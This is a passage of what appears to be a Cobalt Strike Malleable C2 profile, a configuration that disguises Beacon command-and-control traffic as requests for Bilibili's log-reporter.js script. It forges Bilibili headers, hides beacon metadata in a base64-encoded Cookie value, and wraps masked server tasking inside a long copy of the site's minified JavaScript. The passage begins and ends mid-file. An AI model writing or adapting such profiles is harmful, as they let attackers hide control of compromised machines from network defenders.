##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
##    - Multiple URIs can be added. Beacon will randomly pick from these.
##      - Use spaces as a URI seperator
http-get {

    set uri "/bfs/seed/log/report/log-reporter.js";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        #header "Host" "code.jquery.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36";
        header "Referer" "https://www.bilibili.com/";
        header "Accept-Encoding" "gzip, deflate";
        header "Accept-Language" "zh-CN,zh;q=0.9";

        metadata {
            base64url;
            prepend "buvid3=892S6-SSVSD-SGSVS-SDEF; b_nut=S1";
            header "Cookie";
        }
    }

    server {

        header "Server" "Tengine";
        header "Content-Type" "application/javascript; charset=utf-8";
        header "Cache-Control" "max-age=0, no-cache";
        header "Access-Control-Allow-Credentials" "true";
        header "Access-Control-Allow-Headers" "Origin,No-Cache,X-Requested-With,If-Modified-Since,Pragma,Last-Modified,Cache-Control,Expires,Content-Type,Access-Control-Allow-Credentials,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Cache-Webcdn,X-Bilibili-Key-Real-Ip,X-Upos-Auth,Range";
        header "Access-Control-Allow-Methods" "GET, POST, OPTIONS";
        header "Access-Control-Expose-Headers" "Content-Length,X-Cache-Webcdn,Content-Type,Content-Length,Content-Md5,X-Bili-Trace-Id";

        output {   
            mask;
            base64;
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line            
            prepend "(()=>{var e,t,r={5282:(e,t,r)=>{\"use strict\";r.d(t,{Z:()=>p});var n=r(5671),o=r(3144),i=r(5440),a=r(5753),s=r(2884),u=r(8185),c=r(4942),l=r(4625);const f=new(function(){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:90;(0,n.Z)(this,e),(0,c.Z)(this,\"timer\",null),(0,c.Z)(this,\"time\",{day:0,start:0,duration:0}),(0,c.Z)(this,\"lsid\",\"\"),this.time.duration=60*t*1e3,this.init()}return(0,o.Z)(e,[{key:\"init\",value:function(){var e=s.Z.getCookie(\"b_lsid\")||\"\",t=e.split(\"_\");if(t[1]){var r=this.splitDate(parseInt(t[1],16)||-1);this.lsid=e,this.time.start=r.millisecond,this.time.day=r.day}this.check(),this.interval()}},{key:\"interval\",value:function(){var e=this;this.timer||(this.timer=setTimeout((function(){e.check(),clearTimeout(e.timer),e.timer=null,e.interval()}),1e4))}},{key:\"generate\",value:function(){var e=this.splitDate(),t=(0,l.G$)(e.millisecond),r=\"\".concat((0,l.Q4)(8),\"_\").concat(t);this.lsid=r,this.time.start=e.millisecond,this.time.day=e.day,s.Z.setCookie(\"b_lsid\",r,0,\"current-domain\")}},{key:\"check\",value:function(){this.lsid=s.Z.getCookie(\"b_lsid\")||\"\",Date.now()-this.time.start>=this.time.duration&&this.generate(),this.splitDate().day!==this.time.day&&this.generate()}},{key:\"splitDate\",value:function(e){var t=new Date(e||Date.now()),r=t.getDate(),n=t.getHours(),o=t.getMinutes(),i=t.getTime();return{day:r,hour:n,minute:o,second:Math.floor(i/1e3),millisecond:i}}}]),e}());var d=r(8537);const p=new(function(){function e(){var t=this;(0,n.Z)(this,e),this.requestQueue=[],this.requestLimit=6,this.msgObject=null,this.cache={},this.extsMsgConfg={},location.href.indexOf(\"bilihttps\")>-1?this.baseURL=\"https://\".concat(a.Z.dataHost,\"/log/web\"):this.baseURL=\"//\".concat(a.Z.dataHost,\"/log/web\"),this.spmPrefix=s.Z.getSpmPrefix(),this.buvidFp=s.Z.getCookie(\"buvid_fp\"),this.buvid4=s.Z.getCookie(\"buvid4\"),this.initLogIdConfig(),this.updateConfig(),this.reportSelfDef=function(){},this.reportErrorSelfDef=function(){},setInterval((function(){t.checkRequests()}),1e3)}return(0,o.Z)(e,[{key:\"initLogIdConfig\",value:function(){this.logIdConfig={pv:\"000014\",performance:\"000015\",appear:\"000016\",click:\"000017\",abtest:\"001449\",h5_selfDef:\"000080\",errorLog:\"002203\",tech:\"013324\"}}},{key:\"updateConfig\",value:function(){var e=this.logIdConfig,t=(new Date).getTime().toString(),r=encodeURIComponent(window.location.href).substr(0,1e3),n=window.innerWidth||document.body&&document.body.clientWidth,o=window.innerHeight||document.body&&document.body.clientHeight,i=u.Z.ptype(),a=s.Z.getCookie(\"laboratory\"),c=document.referrer?encodeURIComponent(document.referrer).substr(0,1e3):\"\",l=s.Z.getDefaultAbtestInfo(window.abtest);this.msgConfig={appear:{logId:e.appear+t,url:r,spm_id:this.spmPrefix+\".0.0\",timestamp:t,browser_resolution:n+\"x\"+o,ptype:i,msg:\"\",language:\"\",abtest:l,is_selfdef:0},click:{logId:e.click+t,url:r,spm_id:this.spmPrefix+\".0.0\",target_url:\"\",timestamp:t,screenx:\"\",screeny:\"\",browser_resolution:n+\"x\"+o,ptype:i,msg:\"\",abtest:l,refer_url:c,_uuid:s.Z.getCookie(\"_uuid\"),language:navigator.language,laboratory:a,is_selfdef:0},pv:{logId:e.pv+t,url:r,refer_url:c,spm_id:this.spmPrefix?this.spmPrefix+\".0.0\":\"\",timestamp:t,fts:s.Z.getCookie(\"fts\")?s.Z.getCookie(\"fts\"):\"\",browser_resolution:n+\"x\"+o,ptype:i,msg:\"\",abtest:l,_uuid:s.Z.getCookie(\"_uuid\"),language:navigator.language,laboratory:a,is_selfdef:0},abtest:{logId:e.abtest+t,url:r,refer_url:c,spm_id:this.spmPrefix?this.spmPrefix+\".0.0\":\"\",timestamp:t,fts:s.Z.getCookie(\"fts\")?s.Z.getCookie(\"fts\"):\"\",browser_resolution:n+\"x\"+o,ptype:i,msg:\"\",abtest:l,_uuid:s.Z.getCookie(\"_uuid\")},performance:{logId:e.performance+t,url:r,spm_id:this.spmPrefix?this.spmPrefix+\".0.0\":\"\",browser_resolution:n+\"x\"+o,navigationStart:\"\",unloadEventStart:\"\",unloadEventEnd:\"\",redirectStart:\"\",redirectEnd:\"\",fetchStart:\"\",domainLookupStart:\"\",domainLookupEnd:\"\",connectStart:\"\",connectEnd:\"\",secureConnectionStart:\"\",requestStart:\"\",responseStart:\"\",responseEnd:\"\",domLoading:\"\",domInteractive:\"\",domContentLoadedEventStart:\"\",domContentLoadedEventEnd:\"\",domComplete:\"\",loadEventStart:\"\",loadEventEnd:\"\",firstscreenfinish:\"\",ptype:i,language:\"\",abtest:l},h5_selfDef:s.Z.assignObject({logId:e.h5_selfDef+t,url:r,refer_url:c,spm_id:this.spmPrefix+\".0.0\",timestamp:t,fts:s.Z.getCookie(\"fts\")?s.Z.getCookie(\"fts\"):\"\",browser_resolution:n+\"x\"+o,ptype:i,avid:0,bsource:window.bsource||\"default\",args:void 0,abtest:l,_uuid:s.Z.getCookie(\"_uuid\"),brand:\"\",model:\"\",system:\"\",network_type:\"\",session_id:\"\",unique_k:\"\",ua_source:\"\",type:\"\",platform:\"\",page_id:\"\",pageview_id:\"\",share_session_id:\"\"},this.extsMsgConfg.h5_selfDef||{}),errorLog:{logId:e.errorLog+t},tech:{logId:e.tech+t,url:r,spm_id:this.spmPrefix+\".0.0\",target_url:\"\",timestamp:t,screenx:\"\",screeny:\"\",browser_resolution:n+\"x\"+o,ptype:i,msg:\"\",abtest:l,refer_url:c,uuid:s.Z.getCookie(\"_uuid\"),language:navigator.language,laboratory:a,is_selfdef:0}}}},{key:\"updateConfigByType\",value:function(e,t){this.extsMsgConfg[e]=t,this.updateConfig()}},{key:\"setSearchPage\",value:function(){var e=(new Date).getTime();this.secondMsgConfig=s.Z.cloneObj(this.msgConfig),this.secondMsgConfig.click.logId=\"000045\"+e,this.secondMsgConfig.pv.logId=\"000043\"+e,this.secondMsgConfig.performance.logId=\"000044\"+e,delete this.secondMsgConfig.pv.abtest,delete this.secondMsgConfig.click.abtest,delete this.secondMsgConfig.errorLog,delete this.secondMsgConfig.appear,delete this.secondMsgConfig.h5_selfDef}},{key:\"setSPM_id\",value:function(e){this.spmPrefix=e,this.updateConfig()}},{key:\"setMsgObject\",value:function(e){this.msgObject=e}},{key:\"sendUnloadEvent\",value:function(){this.msgObject&&(this.msgObject.unload={enter:performance&&performance.timing&&performance.timing.domComplete,leave:Date.now()}),this.checkMsgObjects()}},{key:\"checkRequests\",value:function(){this.checkMsgObjects(),this.checkrequestPool()}},{key:\"checkMsgObjects\",value:function(){var e=this.msgObject;for(var t in e)\"tryCatchError\"===t?this.reportErrorSelfDef(t,e[t]):this.reportSelfDef(t,e[t]),delete e[t]}},{key:\"checkBuvidFp\",value:function(){return this.buvidFp=s.Z.isInIframe()?\"buvid_fp_iframe\"+(0,l.Rl)():s.Z.getCookie(\"buvid_fp\"),this.buvidFp}},{key:\"checkBuvid4\",value:function(){return this.buvid4=s.Z.getCookie(\"buvid4\"),s.Z.isBuvid(this.buvid4)||s.Z.getBuvidGroup(),this.buvid4}},{key:\"checkrequestPool\",value:function(){var e=this,t=this.requestQueue.length;if(t&&(this.buvidFp||this.checkBuvidFp())){var r=[];t>this.requestLimit?r=this.requestQueue.splice(0,this.requestLimit):(r=this.requestQueue,this.requestQueue=[]),r.forEach((function(t){e.sendMsg(t)}))}}},{key:\"reportWithSpmPrefix\",value:function(e,t,r){if(e&&t){var n={screenx:0,screeny:0};n.timestamp=Date.parse(new Date),n.url=encodeURIComponent(window.location.href),n.spm_id=e+\".selfDef.\"+t,n.target_url=\"\";var o={event:t,value:r};n.msg=JSON.stringify(o).replace(/\"/g,\"%22\"),this.receiveMsg({type:\"click\",obj:n})}}},{key:\"sendFpRisk\",value:function(e,t){t&&(this.cache.fpriskMsg=t),e=e||{};var r=Object.assign({},this.cache.fpriskMsg||{},e.msg);this.receiveMsg({type:\"tech\",obj:Object.assign({is_selfdef:1},e,{spm_id:e.spm_id||this.spmPrefix+\".fp.risk\",msg:r})}),(0,d.b)(Object.assign({},this.msgConfig.tech,{spm_id:e.spm_id||this.spmPrefix+\".fp.risk\"}))}},{key:\"reportCustomData\",value:function(e,t){var r=this;\"fprisk\"!==e?-1!==[\"pv\",\"click\",\"appear\",\"tech\"].indexOf(e)&&(t.is_selfdef=1,s.Z.isValidBuvid()?this.receiveMsg({type:e,obj:t}):s.Z.getBuvidGroup().then((function(){r.receiveMsg({type:e,obj:t})}))):this.sendFpRisk(t)}},{key:\"receiveMsg\",value:function(e,t){var r=e.type,n=e.obj;this.updateConfig();var o=s.Z.assignObject(this.msgConfig[r],n);if(this.reportMsg(o,t),this.secondMsgConfig&&this.secondMsgConfig[r]){var i=s.Z.assignObject(this.secondMsgConfig[r],n);this.reportMsg(i,t)}}},{key:\"receiveGroupMsg\",value:function(e){var t=e.type,r=e.obj;this.updateConfig();var n=s.Z.assignObject(this.msgConfig[t],r);if(this.requestQueue.push(n),this.secondMsgConfig&&this.secondMsgConfig[t]){var o=s.Z.assignObject(this.secondMsgConfig[t],r);this.requestQueue.push(o)}}},{key:\"reportMsg\",value:function(e,t){if(t||this.buvidFp&&this.buvid4)return this.sendMsg(e);this.requestQueue.push(e)}},{key:\"sendMsg\",value:function(e){var t={lsid:f.lsid,buvid_fp:this.buvidFp||s.Z.getCookie(\"buvid_fp\"),buvid4:encodeURIComponent(this.buvid4||s.Z.getCookie(\"buvid4\")),bsource_origin:s.Z.getQueryParam(\"bsource\")||s.Z.getCookie(\"bsource_origin\")||\"empty\",share_source_origin:s.Z.getQueryParam(\"share_source\")||s.Z.getCookie(\"share_source_origin\")||\"empty\"};void 0!==e.msg&&(e.msg=s.Z.mergeBNutMsg(e.msg,t)),void 0!==e.args&&(e.args=s.Z.mergeBNutMsg(e.args,t));var r=\"\";for(var n in e)\"function\"!=typeof e[n]&&(r+=e[n]+\"|\");r=(r=r.substring(0,r.length-1)).replace(\"|\",\"\"),i.Z.useBeacon(\"\".concat(this.baseURL,\"?\").concat(r))}}]),e}())},5753:(e,t,r)=>{\"use strict\";r.d(t,{Z:()=>n});const n={apiHost:\"api.bilibili.com\",dataHost:\"data.bilibili.com\"}},8537:(e,t,r)=>{\"use strict\";r.d(t,{i:()=>S,b:()=>b});var n,o=r(4942),i=r(2884),a=r(5440),s=r(8820),u=r.n(s),c=r(5282),l=r(5753),f=r(1002),d=r(5671),p=r(3144),h=r(4625),v=function(){function e(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:90,r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:\"beer\",n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:\"\",i=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{limit:20};(0,d.Z)(this,e),(0,o.Z)(this,\"key\",\"\"),(0,o.Z)(this,\"sub\",\"\"),(0,o.Z)(this,\"start\",20090626),(0,o.Z)(this,\"time\",{day:0,start:0,duration:0}),(0,o.Z)(this,\"option\",{}),this.key=r,this.sub=n,this.option=i,this.time.duration=60*t*1e3,this.init()}return(0,p.Z)(e,[{key:\"timers\",get:function(){return this.parseTimer()}},{key:\"oTimer\",get:function(){var e=this.timers[this.key];return this.sub?null==e?void 0:e[this.sub]:e}},{key:\"timer\",get:function(){return this.check(),this.oTimer}},{key:\"isNew\",get:function(){return parseInt(this.timer,16)===this.start&&(this.setTimer((0,h.G$)(Date.now())),!0)}},{key:\"init\",value:function(){var e=parseInt(this.oTimer||0,16);if(e>this.start){var t=this.splitDate(e);this.time.start=t.millisecond,this.time.day=t.day}this.check()}},{key:\"check\",value:function(){Date.now()-this.time.start>=this.time.duration?this.reset():this.splitDate().day!==this.time.day&&this.reset()}},{key:\"reset\",value:function(){var e=this.splitDate();this.time.start=e.millisecond,this.time.day=e.day,this.setTimer((0,h.G$)(this.start))}},{key:\"limitCheck\",value:function(){var e=this,t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};if(\"object\"===(0,f.Z)(t[this.key])){var r=Object.keys(t[this.key]);r.length>=this.option.limit&&r.splice(0,r.length-this.option.limit).forEach((function(r){return delete t[e.key][r]}))}return t}},{key:\"setTimer\",value:function(e){var t=this.limitCheck(this.parseTimer());if(this.sub){t[this.key]=t[this.key]||{};try{t[this.key][this.sub]=e}catch(r){t[this.key]=(0,o.Z)({},this.sub,e)}}else t[this.key]=e;\"undefined\"!=typeof window&&window.sessionStorage&&window.sessionStorage.setItem(\"b_timer\",JSON.stringify(t))}},{key:\"parseTimer\",value:function(){var e=sessionStorage.getItem(\"b_timer\")||\"{}\";try{return JSON.parse(e)}catch(e){var t=(0,o.Z)({},this.key,(0,h.G$)(Date.now()));return\"undefined\"!=typeof window&&window.sessionStorage&&window.sessionStorage.setItem(\"b_timer\",JSON.stringify(t)),t}}},{key:\"splitDate\",value:function(e){var t=new Date(e||Date.now()),r=t.getDate(),n=t.getHours(),o=t.getMinutes(),i=t.getTime();return{day:r,hour:n,minute:o,second:Math.floor(i/1e3),millisecond:i}}}]),e}(),g=null,m=(n={url:\"03bf\",spm_id:\"39c8\",target_url:\"34f1\",timestamp:\"5062\",screenx:\"d402\",screeny:\"654a\",browser_resolution:\"6e7c\",ptype:\"3064\",msg:\"3c43\",abtest:\"54ef\",refer_url:\"8b94\",uuid:\"df35\",language:\"5ce3\",laboratory:\"5f45\",is_selfdef:\"db46\",addBehavior:\"6527\",audio:\"d02f\",availableScreenResolution:\"d61f\",b_nut_h:\"3bf4\",buvid_fp:\"737f\",canva_novalid:\"e8ad\",canvas:\"13ab\",colorDepth:\"5766\",cookieEnabled:\"807e\",cpuClass:\"d52f\",deviceMemory:\"1c57\",fonts:\"a658\",hardwareConcurrency:\"0bd0\",hasLiedBrowser:\"097b\",hasLiedLanguages:\"ed31\",hasLiedOs:\"72bd\",hasLiedResolution:\"2673\",indexedDb:\"7003\"},(0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)(n,\"language\",\"07a4\"),\"localStorage\",\"3b21\"),\"lsid\",\"507f\"),\"openDatabase\",\"8a1c\"),\"platform\",\"adca\"),\"plugins\",\"80c9\"),\"screenResolution\",\"748e\"),\"sessionStorage\",\"75b8\"),\"timezone\",\"6aa9\"),\"timezoneOffset\",\"fc9d\"),(0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)((0,o.Z)(n,\"touchSupport\",\"52cd\"),\"userAgent\",\"b8ce\"),\"webdriver\",\"641c\"),\"webglVendorAndRenderer\",\"6bc5\"),\"webgl_novalid\",\"102a\"),\"webgl_params\",\"a3c1\"),\"webgl_str\",\"bfe9\")),y=function(e){var t={};for(var r in e)m[r]&&(t[m[r]]=e[r]);return t},b=function(e){var t,r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:g;if(r&&new v(60,\"ffp\",e.spm_id+\"_\"+(null===(t=i.Z.getCookie(\"";
            # 1st Line
            prepend "/*! For license information please see log-reporter.js.LICENSE.txt */";
            append "\");{i=R.then,P||f(R,\"then\",(function(e,t){var r=this;return new D((function(e,t){l(i,r,e,t)})).then(e,t)}),{unsafe:!0});try{delete R.constructor}catch(e){}d&&d(R,N)}a({global:!0,constructor:!0,wrap:!0,forced:M},{Promise:D}),p(D,A,!1,!0),h(A)},6409:(e,t,r)=>{\"use strict\";var n=r(9989),o=r(3931),i=r(7919),a=r(3689),s=r(6058),u=r(9985),c=r(6373),l=r(2945),f=r(1880),d=i&&i.prototype;if(n({target:\"Promise\",proto:!0,real:!0,forced:!!i&&a((function(){d.finally.call({then:function(){}},(function(){}))}))},{finally:function(e){var t=c(this,s(\"Promise\")),r=u(e);return this.then(r?function(r){return l(t,e()).then((function(){return r}))}:e,r?function(r){return l(t,e()).then((function(){throw r}))}:e)}}),!o&&u(i)){var p=s(\"Promise\").prototype.finally;d.finally!==p&&f(d,\"finally\",p,{unsafe:!0})}},3964:(e,t,r)=>{\"use strict\";r(6697),r(1692),r(5089),r(8829),r(2092),r(7905)},8829:(e,t,r)=>{\"use strict\";var n=r(9989),o=r(2615),i=r(509),a=r(8742),s=r(9302),u=r(8734);n({target:\"Promise\",stat:!0,forced:r(562)},{race:function(e){var t=this,r=a.f(t),n=r.reject,c=s((function(){var a=i(t.resolve);u(e,(function(e){o(a,t,e).then(r.resolve,n)}))}));return c.error&&n(c.value),r.promise}})},2092:(e,t,r)=>{\"use strict\";var n=r(9989),o=r(2615),i=r(8742);n({target:\"Promise\",stat:!0,forced:r(7073).CONSTRUCTOR},{reject:function(e){var t=i.f(this);return o(t.reject,void 0,e),t.promise}})},7905:(e,t,r)=>{\"use strict\";var n=r(9989),o=r(6058),i=r(3931),a=r(7919),s=r(7073).CONSTRUCTOR,u=r(2945),c=o(\"Promise\"),l=i&&!s;n({target:\"Promise\",stat:!0,forced:i||s},{resolve:function(e){return u(l&&this===c?a:this,e)}})},1694:(e,t,r)=>{\"use strict\";var n=r(730).charAt,o=r(4327),i=r(618),a=r(1934),s=r(7807),u=\"String Iterator\",c=i.set,l=i.getterFor(u);a(String,\"String\",(function(e){c(this,{type:u,string:o(e),index:0})}),(function(){var e,t=l(this),r=t.string,o=t.index;return o>=r.length?s(void 0,!0):(e=n(r,o),t.index+=e.length,s(e,!1))}))},810:(e,t,r)=>{\"use strict\";var n=r(9989),o=r(8742);n({target:\"Promise\",stat:!0},{withResolvers:function(){var e=o.f(this);return{promise:e.promise,resolve:e.resolve,reject:e.reject}}})},6265:(e,t,r)=>{\"use strict\";var n=r(9037),o=r(6338),i=r(3265),a=r(752),s=r(5773),u=r(4201),c=u(\"iterator\"),l=u(\"toStringTag\"),f=a.values,d=function(e,t){if(e){if(e[c]!==f)try{s(e,c,f)}catch(t){e[c]=f}if(e[l]||s(e,l,t),o[t])for(var r in a)if(e[r]!==a[r])try{s(e,r,a[r])}catch(t){e[r]=a[r]}}};for(var p in o)d(n[p]&&n[p].prototype,p);d(i,\"DOMTokenList\")},3825:(e,t,r)=>{\"use strict\";var n=r(4279);r(6265),e.exports=n},5671:(e,t,r)=>{\"use strict\";function n(e,t){if(!(e instanceof t))throw new TypeError(\"Cannot call a class as a function\")}r.d(t,{Z:()=>n})},3144:(e,t,r)=>{\"use strict\";r.d(t,{Z:()=>i});var n=r(9142);function o(e,t){for(var r=0;r<t.length;r++){var o=t[r];o.enumerable=o.enumerable||!1,o.configurable=!0,\"value\"in o&&(o.writable=!0),Object.defineProperty(e,(0,n.Z)(o.key),o)}}function i(e,t,r){return t&&o(e.prototype,t),r&&o(e,r),Object.defineProperty(e,\"prototype\",{writable:!1}),e}},4942:(e,t,r)=>{\"use strict\";r.d(t,{Z:()=>o});var n=r(9142);function o(e,t,r){return(t=(0,n.Z)(t))in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}},9142:(e,t,r)=>{\"use strict\";r.d(t,{Z:()=>o});var n=r(1002);function o(e){var t=function(e,t){if(\"object\"!==(0,n.Z)(e)||null===e)return e;var r=e[Symbol.toPrimitive];if(void 0!==r){var o=r.call(e,t||\"default\");if(\"object\"!==(0,n.Z)(o))return o;throw new TypeError(\"@@toPrimitive must return a primitive value.\")}return(\"string\"===t?String:Number)(e)}(e,\"string\");return\"symbol\"===(0,n.Z)(t)?t:String(t)}},1002:(e,t,r)=>{\"use strict\";function n(e){return n=\"function\"==typeof Symbol&&\"symbol\"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&\"function\"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?\"symbol\":typeof e},n(e)}r.d(t,{Z:()=>n})}},n={};function o(e){var t=n[e];if(void 0!==t)return t.exports;var i=n[e]={exports:{}};return r[e].call(i.exports,i,i.exports,o),i.exports}o.m=r,o.amdO={},o.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return o.d(t,{a:t}),t},o.d=(e,t)=>{for(var r in t)o.o(t,r)&&!o.o(e,r)&&Object.defineProperty(e,r,{enumerable:!0,get:t[r]})},o.f={},o.e=e=>Promise.all(Object.keys(o.f).reduce(((t,r)=>(o.f[r](e,t),t)),[])),o.u=e=>e+\".\"+{14:\"78135\",86:\"fd3f7\",220:\"819a3\",507:\"7a69b\",512:\"65972\",770:\"77e98\",950:\"ee096\"}[e]+\".function.chunk.js\",o.g=function(){if(\"object\"==typeof globalThis)return globalThis;try{return this||new Function(\"return this\")()}catch(e){if(\"object\"==typeof window)return window}}(),o.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),e={},t=\"webpackLogReporter:\",o.l=(r,n,i,a)=>{if(e[r])e[r].push(n);else{var s,u;if(void 0!==i)for(var c=document.getElementsByTagName(\"script\"),l=0;l<c.length;l++){var f=c[l];if(f.getAttribute(\"src\")==r||f.getAttribute(\"data-webpack\")==t+i){s=f;break}}s||(u=!0,(s=document.createElement(\"script\")).charset=\"utf-8\",s.timeout=120,o.nc&&s.setAttribute(\"nonce\",o.nc),s.setAttribute(\"data-webpack\",t+i),s.src=r,0!==s.src.indexOf(window.location.origin+\"/\")&&(s.crossOrigin=\"anonymous\")),e[r]=[n];var d=(t,n)=>{s.onerror=s.onload=null,clearTimeout(p);var o=e[r];if(delete e[r],s.parentNode&&s.parentNode.removeChild(s),o&&o.forEach((e=>e(n))),t)return t(n)},p=setTimeout(d.bind(null,void 0,{type:\"timeout\",target:s}),12e4);s.onerror=d.bind(null,s.onerror),s.onload=d.bind(null,s.onload),u&&document.head.appendChild(s)}},o.r=e=>{\"undefined\"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:\"Module\"}),Object.defineProperty(e,\"__esModule\",{value:!0})},o.p=\"//s1.hdslb.com/bfs/seed/log/report/\",(()=>{var e={826:0};o.f.j=(t,r)=>{var n=o.o(e,t)?e[t]:void 0;if(0!==n)if(n)r.push(n[2]);else{var i=new Promise(((r,o)=>n=e[t]=[r,o]));r.push(n[2]=i);var a=o.p+o.u(t),s=new Error;o.l(a,(r=>{if(o.o(e,t)&&(0!==(n=e[t])&&(e[t]=void 0),n)){var i=r&&(\"load\"===r.type?\"missing\":r.type),a=r&&r.target&&r.target.src;s.message=\"Loading chunk \"+t+\" failed.\n(\"+i+\": \"+a+\")\",s.name=\"ChunkLoadError\",s.type=i,s.request=a,n[1](s)}}),\"chunk-\"+t,t)}};var t=(t,r)=>{var n,i,[a,s,u]=r,c=0;if(a.some((t=>0!==e[t]))){for(n in s)o.o(s,n)&&(o.m[n]=s[n]);if(u)u(o)}for(t&&t(r);c<a.length;c++)i=a[c],o.o(e,i)&&e[i]&&e[i][0](),e[i]=0},r=self.webpackChunkwebpackLogReporter=self.webpackChunkwebpackLogReporter||[];r.forEach(t.bind(null,0)),r.push=t.bind(null,r.push.bind(r))})();var i={};(()=>{\"use strict\";o.r(i);var e=o(2884),t=o(5282),r=o(5671),n=o(3144),a=o(1002),s=o(4564),u=o.n(s),c=function(){function o(e){(0,r.Z)(this,o),this.legalContainer=\"report-wrap-module\",this.bindEvent(),this.extMsgs=e&&e.extMsgs||{},e&&e.heatMap&&this.bindHeatMapEvent(),t.Z.reportSelfDef=this.handleSelfDefReport.bind(this)}return(0,n.Z)(o,[{key:\"bindHeatMapEvent\",value:function(){var e=this;document.addEventListener(\"click\",(function(r){var n=r.pageX||0,o=r.pageY||0,i=\"\".concat(t.Z.spmPrefix,\".selfDef.heatMap\");e.todo({},\"\",n,o,i)}),!0)}},{key:\"handleSelfDefReport\",value:function(e,r){if(\"function\"!=typeof t.Z.reportH5SelfDef||\"click\"!==e&&\"pv\"!==e&&\"show\"!==e){if(\"tryCatchError\"!==e){var n=\"\".concat(t.Z.spmPrefix,\".selfDef.\").concat(e),o={event:e,value:r};this.todo(o,\"\",0,0,n,1)}}else t.Z.reportH5SelfDef(e,r)}},{key:\"checkContainer\",value:function(e){return!(!e||\"string\"!=typeof e)&&e.indexOf(this.legalContainer)>-1}},{key:\"bindEvent\",value:function(e){var t=window.document;t.addEventListener?t.addEventListener(\"click\",this.eventCB.bind(this),!1):t.attachEvent(\"onclick\",this.eventCB.bind(this))}},{key:\"eventCB\",value:function(r){var n=t.Z.spmPrefix+\".\",o=(r=r||window.event).target||r.srcElement;3===o.nodeType&&(o=o.parentNode);for(var i=o,a=!1,s=null,c=\"\";i.parentNode&&!this.checkContainer(i.className);){\"a\"!==i.tagName.toLowerCase()||a||(a=!0,s=i,c=encodeURIComponent(s.getAttribute(\"href\"))),i=i.parentNode}if(9!==i.nodeType&&(i.parentNode||this.checkContainer(i.className))&&a){for(var l=-1,f=i.getElementsByTagName(\"a\"),d=0,p=f.length;d<p;d++)if(f[d].isEqualNode&&f[d].isEqualNode(s)){l=d+1;break}var h=null===i.id?\"navigationbar\":\"\"===i.id?\"1000\":i.id,v=n+h+\".\"+l,g=n+e.Z.hexEncode(h)+\".\"+l;this.todo({id:o.id},c,r.screenX,r.screenY,v);var m=decodeURIComponent(c),y=new(u())(m);if(i.id&&\"null\"!==m&&y.hostname&&0!==m.indexOf(\"#\")&&location.href!==y.href){var b=e.Z.addQueryParam(m,\"spm_id_from\",g);s.setAttribute(\"href\",b)}}}},{key:\"todo\",value:function(e,r,n,o,i){var s=arguments.length>5&&void 0!==arguments[5]?arguments[5]:0,u={};if(\"object\"===(0,a.Z)(e))for(var c in e.bsource=window.bsource||\"\",this.extMsgs)\"function\"==typeof this.extMsgs[c]?e[c]=this.extMsgs[c]():e[c]=this.extMsgs[c];u.screenx=n,u.screeny=o,u.is_selfdef=s,u.timestamp=Date.parse(new Date),u.spm_id=i,u.target_url=r;var l=JSON.stringify(e);u.msg=l.replace(/\"/g,\"%22\"),t.Z.receiveMsg({type:\"click\",obj:u})}}]),o}(),l=o(8537),f=o(4625),d=function(){function o(n){if((0,r.Z)(this,o),n&&!1===n.fpmode){if(e.Z.getCookie(\"buvid_fp\"))return;e.Z.setCookie(\"buvid_fp\",\"unlock\",0)}(0,l.i)((function(){t.Z.checkBuvidFp(),t.Z.receiveMsg({type:\"tech\",obj:{spm_id:t.Z.spmPrefix+\".fp.pv\",msg:e.Z.getBnutInfo([\"s\",\"m\",\"h\",\"d\"])}},!0)}));var i=e.Z.getCookie(\"_uuid\");this.pvMsg=n&&n.pvMsg,this.extMsgs=n&&n.extMsgs||{},i&&\"null\"!==i?this._uuid=i:(this._uuid=(0,f.Rl)(),e.Z.setCookie(\"_uuid\",this._uuid,31536e3,\".bilibili.com\")),this.sendPV()}return(0,n.Z)(o,[{key:\"sendPV\",value:function(){var t=this,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};e.Z.isValidBuvid()?this.todo(r):e.Z.getBuvidGroup().then((function(){t.todo(r)}))}},{key:\"todo\",value:function(e){var r=e.refer,n=e.msg,o=e.url,i=e.is_selfdef,a={},s=this.pvMsg||{};if(\"undefined\"!=typeof window&&window.localStorage&&localStorage.index_user_setting){var u=JSON.parse(localStorage.index_user_setting).sort;s.sort=u}for(var c in window.bsource&&(s.bsource=window.bsource),this.extMsgs)\"function\"==typeof 